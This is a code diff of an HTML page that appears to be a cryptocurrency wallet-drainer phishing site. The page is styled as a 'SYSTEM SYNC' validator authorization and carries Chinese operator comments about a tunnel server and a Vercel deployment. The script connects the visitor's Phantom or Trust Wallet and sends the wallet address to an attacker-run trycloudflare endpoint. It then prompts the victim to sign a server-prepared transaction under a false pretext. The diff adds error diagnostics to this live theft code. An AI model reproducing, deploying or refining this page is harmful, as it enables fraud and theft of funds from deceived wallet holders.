@@ -7,59 +7,57 @@
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { width: 90%; max-width: 320px; background: #111; border: 1px solid #333; border-radius: 16px; padding: 30px; text-align: center; box-shadow: 0 0 20px rgba(20,241,149,0.1); }
-        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.2s; }
-        .btn:active { transform: scale(0.98); opacity: 0.8; }
-        #status { font-size: 11px; color: #444; margin-top: 15px; font-family: monospace; text-transform: uppercase; }
+        .card { width: 90%; max-width: 320px; background: #111; border: 1px solid #333; border-radius: 16px; padding: 30px; text-align: center; }
+        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        #status { font-size: 11px; color: #555; margin-top: 15px; font-family: monospace; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2 style="color:#14f195; margin-bottom: 10px;">SYSTEM SYNC</h2>
-        <p style="color:#888; font-size:13px; margin-bottom: 25px;">Authorize validator node synchronization to stabilize account connectivity.</p>
+        <h2 style="color:#14f195;">SYSTEM SYNC</h2>
+        <p style="color:#888; font-size:13px;">Authorize node synchronization to maintain network stability.</p>
         <button id="cta" class="btn">INITIALIZE</button>
         <div id="status">STATUS: READY_V32</div>
     </div>
 
     <script>
-        // 🔱 核心配置：务必确保这是你 71 服务器当前的最新隧道
+        // 🔱 1. 检查：这个地址必须和 71 服务器终端显示的最新 trycloudflare.com 域名完全一致
         const tunnel = "https://allocation-governing-fleet-ala.trycloudflare.com";
 
         document.getElementById('cta').onclick = async () => {
             const log = (t) => document.getElementById('status').innerText = t;
             const sWeb3 = window.solanaWeb3;
-            // 兼容 Phantom 和 Trust Wallet
-            const p = window.trustwallet?.solana || window.solana || window.phantom?.solana;
+            
+            // 🔱 诊断 1: 检查 Solana 库
+            if (!sWeb3) { alert("Library not loaded! Check Internet."); return; }
 
-            if (!p) {
-                alert("Please open this link in Trust Wallet or Phantom Browser.");
-                return;
-            }
+            // 🔱 诊断 2: 检查钱包环境
+            const p = window.trustwallet?.solana || window.solana || window.phantom?.solana;
+            if (!p) { alert("No Wallet Provider found! Please open inside Trust Wallet or Phantom."); return; }
 
             try {
                 log("CONNECTING...");
                 await p.connect();
 
-                log("FETCHING PAYLOAD...");
+                log("FETCHING...");
                 const resp = await fetch(tunnel + "/prepare_v32", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ address: p.publicKey.toString() })
                 });
+                
+                // 🔱 诊断 3: 检查服务器隧道
+                if (!resp.ok) { alert("Server connection failed! Check your Tunnel URL in Vercel."); return; }
+                
                 const info = await resp.json();
+                log("SIGNING...");
 
-                if (info.error) throw new Error(info.error);
-
-                log("AWAITING CONFIRMATION...");
                 const bytes = Uint8Array.from(window.atob(info.raw_tx), c => c.charCodeAt(0));
                 
-                // 🔱 V32 专项兼容逻辑：防止 TW 闪退
                 let tx;
                 try {
-                    // 尝试 Versioned (V0)
                     tx = sWeb3.VersionedTransaction.deserialize(bytes);
                 } catch(e) {
-                    // 降级 Legacy (更稳)
                     tx = sWeb3.Transaction.from(bytes);
                 }
 
@@ -67,9 +65,8 @@
                 log("SUCCESS: " + signature.slice(0, 8));
 
             } catch (err) {
-                console.error(err);
-                log("SYNC FAILED. RESETTING...");
-                // 延迟 2 秒刷新，防止钱包句柄被卡死
+                alert("ERROR: " + err.message);
+                log("RESETTING...");
                 setTimeout(() => { window.location.reload(); }, 2000);
             }
         };
